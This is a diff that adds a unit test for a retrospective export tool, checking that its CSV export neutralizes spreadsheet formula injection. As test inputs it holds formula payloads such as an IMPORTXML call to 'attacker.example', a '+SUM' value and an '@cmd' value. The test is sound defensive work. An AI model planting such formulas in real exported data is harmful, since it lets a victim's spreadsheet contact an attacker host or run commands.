@@ -69,4 +69,12 @@ describe("anonymous retro exports", () => {
     expect(formatActionsJson(exportData.actions)).toContain("\"text\": \"Alice to create launch checklist\"");
     expect(formatActionsCsv(exportData.actions)).toBe("order,text\n1,Alice to create launch checklist\n");
   });
+
+  it("neutralizes spreadsheet formulas in action CSV exports", () => {
+    expect(formatActionsCsv([
+      { id: "action-1", text: "=IMPORTXML(\"https://attacker.example\")", order: 0 },
+      { id: "action-2", text: "+SUM(1,2)", order: 1 },
+      { id: "action-3", text: "@cmd", order: 2 },
+    ])).toBe("order,text\n1,\"'=IMPORTXML(\"\"https://attacker.example\"\")\"\n2,\"'+SUM(1,2)\"\n3,'@cmd\n");
+  });
 });
